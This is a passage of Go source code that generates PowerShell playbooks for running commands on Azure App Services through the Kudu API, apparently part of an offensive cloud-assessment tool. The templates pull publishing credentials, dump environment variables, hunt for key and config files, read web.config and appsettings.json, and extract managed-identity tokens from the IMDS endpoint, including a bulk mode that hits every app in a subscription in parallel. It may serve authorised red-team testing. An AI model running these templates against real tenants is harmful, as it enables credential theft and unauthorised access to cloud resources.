	template += fmt.Sprintf("$response = Invoke-RestMethod -Method POST `\n")
	template += fmt.Sprintf("    -Uri \"https://%s/api/command\" `\n", app.SCMHostname)
	template += fmt.Sprintf("    -Headers $authHeader `\n")
	template += fmt.Sprintf("    -Body $commandBody `\n")
	template += fmt.Sprintf("    -ContentType \"application/json\"\n\n")
	template += fmt.Sprintf("# Display output\n")
	template += fmt.Sprintf("$response.Output\n")
	template += fmt.Sprintf("$response.Error\n")
	template += fmt.Sprintf("```\n\n")

	template += fmt.Sprintf("## Method 2: Kudu API - Using RBAC/Azure AD Authentication\n\n")
	template += fmt.Sprintf("This method uses your current Azure AD authentication token instead of publishing credentials.\n\n")
	template += fmt.Sprintf("```powershell\n")
	template += fmt.Sprintf("# Get Azure AD access token\n")
	template += fmt.Sprintf("$token = (Get-AzAccessToken -ResourceUrl \"https://management.azure.com/\").Token\n")
	template += fmt.Sprintf("$authHeader = @{Authorization=\"Bearer $token\"}\n\n")
	template += fmt.Sprintf("# Prepare command\n")
	template += fmt.Sprintf("$commandBody = @{command = \"%s\"} | ConvertTo-Json\n\n", exampleCommand)
	template += fmt.Sprintf("# Execute command\n")
	template += fmt.Sprintf("$response = Invoke-RestMethod -Method POST `\n")
	template += fmt.Sprintf("    -Uri \"https://%s/api/command\" `\n", app.SCMHostname)
	template += fmt.Sprintf("    -Headers $authHeader `\n")
	template += fmt.Sprintf("    -Body $commandBody `\n")
	template += fmt.Sprintf("    -ContentType \"application/json\"\n\n")
	template += fmt.Sprintf("# Display output\n")
	template += fmt.Sprintf("$response.Output\n")
	template += fmt.Sprintf("```\n\n")

	// Add Windows Container-specific method if applicable
	if !app.IsLinux && app.IsContainer {
		template += generateKuduDebugConsoleTemplate(app)
	}

	// Add OS-specific examples
	if app.IsLinux {
		template += generateLinuxAppServiceExamples(app)
	} else {
		template += generateWindowsAppServiceExamples(app)
	}

	template += fmt.Sprintf("## Required Permissions\n\n")
	template += fmt.Sprintf("**For Publishing Credentials Method:**\n")
	template += fmt.Sprintf("- **Website Contributor** role or higher on the App Service\n")
	template += fmt.Sprintf("- Ability to call `Get-AzWebAppPublishingProfile`\n\n")
	template += fmt.Sprintf("**For RBAC/Azure AD Method:**\n")
	template += fmt.Sprintf("- **Contributor** or **Owner** role on the App Service\n")
	template += fmt.Sprintf("- **Website Contributor** role on the App Service\n\n")

	template += fmt.Sprintf("## Important Notes\n\n")
	template += fmt.Sprintf("- Commands execute in the context of the App Service runtime\n")
	template += fmt.Sprintf("- Working directory is typically `D:\\home\\site\\wwwroot` (Windows) or `/home/site/wwwroot` (Linux)\n")
	template += fmt.Sprintf("- Publishing credentials may be disabled on some App Services (check BasicPublishingCredentialsPolicies)\n")
	template += fmt.Sprintf("- Command execution is logged in App Service logs and may trigger alerts\n")
	template += fmt.Sprintf("- Some App Services may have SCM access restricted by IP or VNet integration\n")
	if app.HasIdentity {
		template += fmt.Sprintf("- This app has a managed identity - you can extract tokens via IMDS endpoint\n")
	}
	template += fmt.Sprintf("\n")

	return template
}

// generateKuduDebugConsoleTemplate generates template for Windows Container debug console access
func generateKuduDebugConsoleTemplate(app AppServiceCommandInfo) string {
	var template string

	template += fmt.Sprintf("## Method 3: Kudu Debug Console (Windows Containers Only)\n\n")
	template += fmt.Sprintf("This method uses the Kudu Debug Console streaming API for interactive command execution on Windows containers.\n")
	template += fmt.Sprintf("It provides a more interactive shell experience but is more complex to implement.\n\n")

	template += fmt.Sprintf("```powershell\n")
	template += fmt.Sprintf("# This is a simplified example - full implementation requires SignalR-like streaming\n\n")
	template += fmt.Sprintf("# Get publishing credentials or use Azure AD token\n")
	template += fmt.Sprintf("$app = Get-AzWebApp -Name \"%s\" -ResourceGroupName \"%s\"\n", app.AppName, app.ResourceGroup)
	template += fmt.Sprintf("[xml]$publishProfile = Get-AzWebAppPublishingProfile -Name $app.Name -ResourceGroupName $app.ResourceGroup\n")
	template += fmt.Sprintf("$username = $publishProfile.publishData.publishProfile[0].userName\n")
	template += fmt.Sprintf("$password = $publishProfile.publishData.publishProfile[0].userPWD\n")
	template += fmt.Sprintf("$basicAuth = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(\"$username:$password\"))\n")
	template += fmt.Sprintf("$authHeader = @{Authorization=\"Basic $basicAuth\"}\n\n")

	template += fmt.Sprintf("# Step 1: Negotiate connection\n")
	template += fmt.Sprintf("$promptType = \"powershell\"  # or \"CMD\"\n")
	template += fmt.Sprintf("$negotiateUrl = \"https://%s/api/commandstream/negotiate?clientProtocol=1.4&shell=$promptType\"\n", app.SCMHostname)
	template += fmt.Sprintf("$negotiateResponse = Invoke-RestMethod -Uri $negotiateUrl -Headers $authHeader\n")
	template += fmt.Sprintf("$connectionToken = [System.Web.HttpUtility]::UrlPathEncode($negotiateResponse.ConnectionToken).Replace('+','%%2b')\n\n")

	template += fmt.Sprintf("# Step 2: Connect to command stream\n")
	template += fmt.Sprintf("$tid = Get-Random -Minimum 0 -Maximum 10\n")
	template += fmt.Sprintf("$timestamp = Get-Date -UFormat %%s -Millisecond 0\n")
	template += fmt.Sprintf("$connectUrl = \"https://%s/api/commandstream/connect?transport=longPolling&clientProtocol=1.4&shell=$promptType&connectionToken=$connectionToken&tid=$tid&_=$timestamp\"\n", app.SCMHostname)
	template += fmt.Sprintf("$connectResponse = Invoke-RestMethod -Uri $connectUrl -Headers $authHeader\n")
	template += fmt.Sprintf("$messageId = $connectResponse.C\n\n")

	template += fmt.Sprintf("# Step 3: Start command stream\n")
	template += fmt.Sprintf("$startUrl = \"https://%s/api/commandstream/start?transport=longPolling&clientProtocol=1.4&shell=$promptType&connectionToken=$connectionToken\"\n", app.SCMHostname)
	template += fmt.Sprintf("Invoke-RestMethod -Uri $startUrl -Headers $authHeader | Out-Null\n\n")

	template += fmt.Sprintf("# Step 4: Send command\n")
	template += fmt.Sprintf("$command = \"dir D:\\home\\n\"  # Note the \\n newline\n")
	template += fmt.Sprintf("$sendUrl = \"https://%s/api/commandstream/send?transport=longPolling&clientProtocol=1.4&shell=$promptType&connectionToken=$connectionToken\"\n", app.SCMHostname)
	template += fmt.Sprintf("$sendBody = @{data=$command}\n")
	template += fmt.Sprintf("Invoke-RestMethod -Method Post -Uri $sendUrl -Headers $authHeader -Body $sendBody -ContentType \"application/x-www-form-urlencoded\" | Out-Null\n\n")

	template += fmt.Sprintf("# Step 5: Poll for results (simplified - real implementation loops until complete)\n")
	template += fmt.Sprintf("$pollUrl = \"https://%s/api/commandstream/poll?transport=longPolling&messageId=$messageId&clientProtocol=1.4&shell=$promptType&connectionToken=$connectionToken&tid=$tid&_=$timestamp\"\n", app.SCMHostname)
	template += fmt.Sprintf("$pollResponse = Invoke-RestMethod -Uri $pollUrl -Headers $authHeader -TimeoutSec 5\n")
	template += fmt.Sprintf("$pollResponse.M.Output\n\n")

	template += fmt.Sprintf("# Step 6: Abort/close session\n")
	template += fmt.Sprintf("$abortUrl = \"https://%s/api/commandstream/abort?transport=longPolling&clientProtocol=1.4&shell=$promptType&connectionToken=$connectionToken\"\n", app.SCMHostname)
	template += fmt.Sprintf("Invoke-RestMethod -Method Post -Uri $abortUrl -Headers $authHeader -ContentType \"application/json\" | Out-Null\n")
	template += fmt.Sprintf("```\n\n")

	template += fmt.Sprintf("**Note:** The Debug Console method is complex and best suited for interactive scenarios.\n")
	template += fmt.Sprintf("For simple command execution, use Method 1 or 2 instead.\n\n")

	return template
}

// generateWindowsAppServiceExamples generates Windows-specific App Service command examples
func generateWindowsAppServiceExamples(app AppServiceCommandInfo) string {
	var examples string

	examples += fmt.Sprintf("## Windows App Service Examples\n\n")

	examples += fmt.Sprintf("### Example 1: Enumerate Environment Variables\n\n")
	examples += fmt.Sprintf("```powershell\n")
	examples += fmt.Sprintf("# Environment variables often contain secrets, connection strings, etc.\n")
	examples += fmt.Sprintf("$commandBody = @{command = \"set\"} | ConvertTo-Json\n")
	examples += fmt.Sprintf("$response = Invoke-RestMethod -Method POST `\n")
	examples += fmt.Sprintf("    -Uri \"https://%s/api/command\" `\n", app.SCMHostname)
	examples += fmt.Sprintf("    -Headers $authHeader `\n")
	examples += fmt.Sprintf("    -Body $commandBody `\n")
	examples += fmt.Sprintf("    -ContentType \"application/json\"\n")
	examples += fmt.Sprintf("$response.Output\n")
	examples += fmt.Sprintf("```\n\n")

	examples += fmt.Sprintf("### Example 2: Search for Configuration Files\n\n")
	examples += fmt.Sprintf("```powershell\n")
	examples += fmt.Sprintf("$commandBody = @{\n")
	examples += fmt.Sprintf("    command = \"dir /s /b D:\\home\\*.config D:\\home\\*.json D:\\home\\*.xml 2>nul\"\n")
	examples += fmt.Sprintf("} | ConvertTo-Json\n")
	examples += fmt.Sprintf("$response = Invoke-RestMethod -Method POST `\n")
	examples += fmt.Sprintf("    -Uri \"https://%s/api/command\" `\n", app.SCMHostname)
	examples += fmt.Sprintf("    -Headers $authHeader `\n")
	examples += fmt.Sprintf("    -Body $commandBody `\n")
	examples += fmt.Sprintf("    -ContentType \"application/json\"\n")
	examples += fmt.Sprintf("$response.Output\n")
	examples += fmt.Sprintf("```\n\n")

	examples += fmt.Sprintf("### Example 3: Read Application Settings (web.config)\n\n")
	examples += fmt.Sprintf("```powershell\n")
	examples += fmt.Sprintf("$commandBody = @{\n")
	examples += fmt.Sprintf("    command = \"type D:\\home\\site\\wwwroot\\web.config\"\n")
	examples += fmt.Sprintf("} | ConvertTo-Json\n")
	examples += fmt.Sprintf("$response = Invoke-RestMethod -Method POST `\n")
	examples += fmt.Sprintf("    -Uri \"https://%s/api/command\" `\n", app.SCMHostname)
	examples += fmt.Sprintf("    -Headers $authHeader `\n")
	examples += fmt.Sprintf("    -Body $commandBody `\n")
	examples += fmt.Sprintf("    -ContentType \"application/json\"\n")
	examples += fmt.Sprintf("$response.Output\n")
	examples += fmt.Sprintf("```\n\n")

	if app.HasIdentity {
		examples += fmt.Sprintf("### Example 4: Extract Managed Identity Token\n\n")
		examples += fmt.Sprintf("```powershell\n")
		examples += fmt.Sprintf("# Use PowerShell to query IMDS endpoint\n")
		examples += fmt.Sprintf("$commandBody = @{\n")
		examples += fmt.Sprintf("    command = \"powershell -Command \\\"(Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Headers @{Metadata='true'} -UseBasicParsing).Content\\\"\"\n")
		examples += fmt.Sprintf("} | ConvertTo-Json\n")
		examples += fmt.Sprintf("$response = Invoke-RestMethod -Method POST `\n")
		examples += fmt.Sprintf("    -Uri \"https://%s/api/command\" `\n", app.SCMHostname)
		examples += fmt.Sprintf("    -Headers $authHeader `\n")
		examples += fmt.Sprintf("    -Body $commandBody `\n")
		examples += fmt.Sprintf("    -ContentType \"application/json\"\n")
		examples += fmt.Sprintf("$tokenData = $response.Output | ConvertFrom-Json\n")
		examples += fmt.Sprintf("$tokenData.access_token\n")
		examples += fmt.Sprintf("```\n\n")
	}

	return examples
}

// generateLinuxAppServiceExamples generates Linux-specific App Service command examples
func generateLinuxAppServiceExamples(app AppServiceCommandInfo) string {
	var examples string

	examples += fmt.Sprintf("## Linux App Service Examples\n\n")

	examples += fmt.Sprintf("### Example 1: Enumerate Environment Variables\n\n")
	examples += fmt.Sprintf("```powershell\n")
	examples += fmt.Sprintf("$commandBody = @{command = \"env\"} | ConvertTo-Json\n")
	examples += fmt.Sprintf("$response = Invoke-RestMethod -Method POST `\n")
	examples += fmt.Sprintf("    -Uri \"https://%s/api/command\" `\n", app.SCMHostname)
	examples += fmt.Sprintf("    -Headers $authHeader `\n")
	examples += fmt.Sprintf("    -Body $commandBody `\n")
	examples += fmt.Sprintf("    -ContentType \"application/json\"\n")
	examples += fmt.Sprintf("$response.Output\n")
	examples += fmt.Sprintf("```\n\n")

	examples += fmt.Sprintf("### Example 2: Search for Secrets and Keys\n\n")
	examples += fmt.Sprintf("```powershell\n")
	examples += fmt.Sprintf("$commandBody = @{\n")
	examples += fmt.Sprintf("    command = \"find /home -type f \\( -name '*.pem' -o -name '*.key' -o -name '*.crt' -o -name '.env' -o -name 'appsettings*.json' \\) 2>/dev/null\"\n")
	examples += fmt.Sprintf("} | ConvertTo-Json\n")
	examples += fmt.Sprintf("$response = Invoke-RestMethod -Method POST `\n")
	examples += fmt.Sprintf("    -Uri \"https://%s/api/command\" `\n", app.SCMHostname)
	examples += fmt.Sprintf("    -Headers $authHeader `\n")
	examples += fmt.Sprintf("    -Body $commandBody `\n")
	examples += fmt.Sprintf("    -ContentType \"application/json\"\n")
	examples += fmt.Sprintf("$response.Output\n")
	examples += fmt.Sprintf("```\n\n")

	examples += fmt.Sprintf("### Example 3: Read Application Configuration\n\n")
	examples += fmt.Sprintf("```powershell\n")
	examples += fmt.Sprintf("$commandBody = @{\n")
	examples += fmt.Sprintf("    command = \"cat /home/site/wwwroot/appsettings.json\"\n")
	examples += fmt.Sprintf("} | ConvertTo-Json\n")
	examples += fmt.Sprintf("$response = Invoke-RestMethod -Method POST `\n")
	examples += fmt.Sprintf("    -Uri \"https://%s/api/command\" `\n", app.SCMHostname)
	examples += fmt.Sprintf("    -Headers $authHeader `\n")
	examples += fmt.Sprintf("    -Body $commandBody `\n")
	examples += fmt.Sprintf("    -ContentType \"application/json\"\n")
	examples += fmt.Sprintf("$response.Output\n")
	examples += fmt.Sprintf("```\n\n")

	if app.HasIdentity {
		examples += fmt.Sprintf("### Example 4: Extract Managed Identity Token\n\n")
		examples += fmt.Sprintf("```powershell\n")
		examples += fmt.Sprintf("$commandBody = @{\n")
		examples += fmt.Sprintf("    command = \"curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true\"\n")
		examples += fmt.Sprintf("} | ConvertTo-Json\n")
		examples += fmt.Sprintf("$response = Invoke-RestMethod -Method POST `\n")
		examples += fmt.Sprintf("    -Uri \"https://%s/api/command\" `\n", app.SCMHostname)
		examples += fmt.Sprintf("    -Headers $authHeader `\n")
		examples += fmt.Sprintf("    -Body $commandBody `\n")
		examples += fmt.Sprintf("    -ContentType \"application/json\"\n")
		examples += fmt.Sprintf("$tokenData = $response.Output | ConvertFrom-Json\n")
		examples += fmt.Sprintf("$tokenData.access_token\n")
		examples += fmt.Sprintf("```\n\n")
	}

	return examples
}

// GenerateBulkAppServiceCommandTemplate creates a template for running commands on multiple App Services
func GenerateBulkAppServiceCommandTemplate(apps []AppServiceCommandInfo, subscriptionID string) string {
	if len(apps) == 0 {
		return ""
	}

	var template string

	template += fmt.Sprintf("# ============================================================================\n")
	template += fmt.Sprintf("# BULK APP SERVICES COMMAND EXECUTION TEMPLATE\n")
	template += fmt.Sprintf("# Subscription: %s\n", subscriptionID)
	template += fmt.Sprintf("# Total App Services: %d\n", len(apps))
	template += fmt.Sprintf("# ============================================================================\n\n")

	template += fmt.Sprintf("## WARNING\n")
	template += fmt.Sprintf("# Executing commands on multiple App Services can:\n")
	template += fmt.Sprintf("# - Generate App Service logs and Azure Monitor alerts\n")
	template += fmt.Sprintf("# - Trigger security monitoring if enabled\n")
	template += fmt.Sprintf("# - Impact application performance\n")
	template += fmt.Sprintf("# - Be blocked by IP restrictions or VNet integration\n\n")

	template += fmt.Sprintf("## Method 1: PowerShell - Iterate All App Services\n\n")
	template += fmt.Sprintf("```powershell\n")
	template += fmt.Sprintf("# Define App Services to target\n")
	template += fmt.Sprintf("$apps = @(\n")
	for i, app := range apps {
		template += fmt.Sprintf("    @{Name='%s'; ResourceGroup='%s'; SCM='%s'; IsLinux=$%v}",
			app.AppName, app.ResourceGroup, app.SCMHostname, app.IsLinux)
		if i < len(apps)-1 {
			template += fmt.Sprintf(",\n")
		} else {
			template += fmt.Sprintf("\n")
		}
	}
	template += fmt.Sprintf(")\n\n")

	template += fmt.Sprintf("# Set subscription context\n")
	template += fmt.Sprintf("Set-AzContext -Subscription '%s'\n\n", subscriptionID)

	template += fmt.Sprintf("# Define command (adjust based on OS)\n")
	template += fmt.Sprintf("$winCommand = \"set\"  # Windows: enumerate environment\n")
	template += fmt.Sprintf("$linuxCommand = \"env\"  # Linux: enumerate environment\n\n")

	template += fmt.Sprintf("# Iterate and execute commands\n")
	template += fmt.Sprintf("foreach ($app in $apps) {\n")
	template += fmt.Sprintf("    Write-Host \"Executing on: $($app.Name)\"\n")
	template += fmt.Sprintf("    \n")
	template += fmt.Sprintf("    # Get access token\n")
	template += fmt.Sprintf("    $token = (Get-AzAccessToken -ResourceUrl \"https://management.azure.com/\").Token\n")
	template += fmt.Sprintf("    $authHeader = @{Authorization=\"Bearer $token\"}\n")
	template += fmt.Sprintf("    \n")
	template += fmt.Sprintf("    # Select command based on OS\n")
	template += fmt.Sprintf("    $command = if ($app.IsLinux) { $linuxCommand } else { $winCommand }\n")
	template += fmt.Sprintf("    $commandBody = @{command = $command} | ConvertTo-Json\n")
	template += fmt.Sprintf("    \n")
	template += fmt.Sprintf("    try {\n")
	template += fmt.Sprintf("        $response = Invoke-RestMethod -Method POST `\n")
	template += fmt.Sprintf("            -Uri \"https://$($app.SCM)/api/command\" `\n")
	template += fmt.Sprintf("            -Headers $authHeader `\n")
	template += fmt.Sprintf("            -Body $commandBody `\n")
	template += fmt.Sprintf("            -ContentType \"application/json\" `\n")
	template += fmt.Sprintf("            -ErrorAction Stop\n")
	template += fmt.Sprintf("        \n")
	template += fmt.Sprintf("        Write-Host \"Output from $($app.Name):\"\n")
	template += fmt.Sprintf("        Write-Host $response.Output\n")
	template += fmt.Sprintf("        if ($response.Error) {\n")
	template += fmt.Sprintf("            Write-Host \"Errors: $($response.Error)\" -ForegroundColor Yellow\n")
	template += fmt.Sprintf("        }\n")
	template += fmt.Sprintf("        Write-Host \"`n\" + ('-' * 80) + \"`n\"\n")
	template += fmt.Sprintf("    }\n")
	template += fmt.Sprintf("    catch {\n")
	template += fmt.Sprintf("        Write-Host \"Error on $($app.Name): $_\" -ForegroundColor Red\n")
	template += fmt.Sprintf("    }\n")
	template += fmt.Sprintf("}\n")
	template += fmt.Sprintf("```\n\n")

	template += fmt.Sprintf("## Method 2: Parallel Execution with PowerShell Jobs\n\n")
	template += fmt.Sprintf("```powershell\n")
	template += fmt.Sprintf("# Define apps (same as Method 1)\n")
	template += fmt.Sprintf("$apps = @(\n")
	for i, app := range apps {
		template += fmt.Sprintf("    @{Name='%s'; ResourceGroup='%s'; SCM='%s'; IsLinux=$%v}",
			app.AppName, app.ResourceGroup, app.SCMHostname, app.IsLinux)
		if i < len(apps)-1 {
			template += fmt.Sprintf(",\n")
		} else {
			template += fmt.Sprintf("\n")
		}
	}
	template += fmt.Sprintf(")\n\n")

	template += fmt.Sprintf("# Execute in parallel using jobs\n")
	template += fmt.Sprintf("$jobs = @()\n")
	template += fmt.Sprintf("foreach ($app in $apps) {\n")
	template += fmt.Sprintf("    $jobs += Start-Job -ScriptBlock {\n")
	template += fmt.Sprintf("        param($AppName, $SCMHostname, $IsLinux, $SubscriptionId)\n")
	template += fmt.Sprintf("        \n")
	template += fmt.Sprintf("        Import-Module Az.Accounts, Az.Websites\n")
	template += fmt.Sprintf("        Set-AzContext -Subscription $SubscriptionId | Out-Null\n")
	template += fmt.Sprintf("        \n")
	template += fmt.Sprintf("        $token = (Get-AzAccessToken -ResourceUrl \"https://management.azure.com/\").Token\n")
	template += fmt.Sprintf("        $authHeader = @{Authorization=\"Bearer $token\"}\n")
	template += fmt.Sprintf("        \n")
	template += fmt.Sprintf("        $command = if ($IsLinux) { \"env\" } else { \"set\" }\n")
	template += fmt.Sprintf("        $commandBody = @{command = $command} | ConvertTo-Json\n")
	template += fmt.Sprintf("        \n")
	template += fmt.Sprintf("        $response = Invoke-RestMethod -Method POST `\n")
	template += fmt.Sprintf("            -Uri \"https://$SCMHostname/api/command\" `\n")
	template += fmt.Sprintf("            -Headers $authHeader `\n")
	template += fmt.Sprintf("            -Body $commandBody `\n")
	template += fmt.Sprintf("            -ContentType \"application/json\"\n")
	template += fmt.Sprintf("        \n")
	template += fmt.Sprintf("        [PSCustomObject]@{\n")
	template += fmt.Sprintf("            AppName = $AppName\n")
	template += fmt.Sprintf("            Output = $response.Output\n")
	template += fmt.Sprintf("            Error = $response.Error\n")
	template += fmt.Sprintf("        }\n")
	template += fmt.Sprintf("    } -ArgumentList $app.Name, $app.SCM, $app.IsLinux, '%s'\n", subscriptionID)
	template += fmt.Sprintf("}\n\n")
	template += fmt.Sprintf("# Wait for all jobs to complete\n")
	template += fmt.Sprintf("$results = $jobs | Wait-Job | Receive-Job\n\n")
	template += fmt.Sprintf("# Display results\n")
	template += fmt.Sprintf("foreach ($result in $results) {\n")
	template += fmt.Sprintf("    Write-Host \"=\" * 80\n")
	template += fmt.Sprintf("    Write-Host \"App: $($result.AppName)\"\n")
	template += fmt.Sprintf("    Write-Host \"=\" * 80\n")
	template += fmt.Sprintf("    Write-Host $result.Output\n")
	template += fmt.Sprintf("    if ($result.Error) {\n")
	template += fmt.Sprintf("        Write-Host \"Errors: $($result.Error)\" -ForegroundColor Yellow\n")
	template += fmt.Sprintf("    }\n")
	template += fmt.Sprintf("    Write-Host \"\"\n")
	template += fmt.Sprintf("}\n\n")
	template += fmt.Sprintf("# Clean up jobs\n")
	template += fmt.Sprintf("$jobs | Remove-Job\n")
	template += fmt.Sprintf("```\n\n")

	return template
}
